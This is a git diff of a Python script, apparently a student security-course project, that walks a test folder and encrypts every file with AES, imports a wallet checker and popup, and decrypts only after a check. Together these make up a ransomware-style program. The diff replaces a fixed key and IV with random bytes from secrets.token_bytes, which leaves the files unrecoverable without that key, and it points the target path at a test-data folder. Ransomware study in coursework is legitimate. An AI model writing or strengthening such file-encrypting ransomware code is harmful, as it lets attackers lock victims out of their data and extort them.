@@ -1,12 +1,14 @@
 from base64 import encode
 import os
 import threading
+import secrets
 from util.AES import aes
 from util.checkWallet import CheckWallet
 from util.popup import PopUp
 
-
-a = aes(b'6969696969696969', b'4242424242424242')
+key = secrets.token_bytes(16)
+iv = secrets.token_bytes(16)
+a = aes(key, iv)
 def encodeFiles(path):
     for root, _, files in os.walk(path):
         for file in files:
@@ -29,10 +31,7 @@ def check():
         decodeFiles(path)
     print("Files have been decrypted!")
 
-path = "C:/Users/Neh Patel/Desktop/repos/testing/cosc469-testing-data"
-# sha256sum -c hash.sha256
-# USERPROFILE = os.environ.get('USERPROFILE')
-
+path = "C:/Users/nehpa/Desktop/repos/testing/cosc469-testing-data"
 
 encodeFiles(path)
 print("Files have been encrypted!")
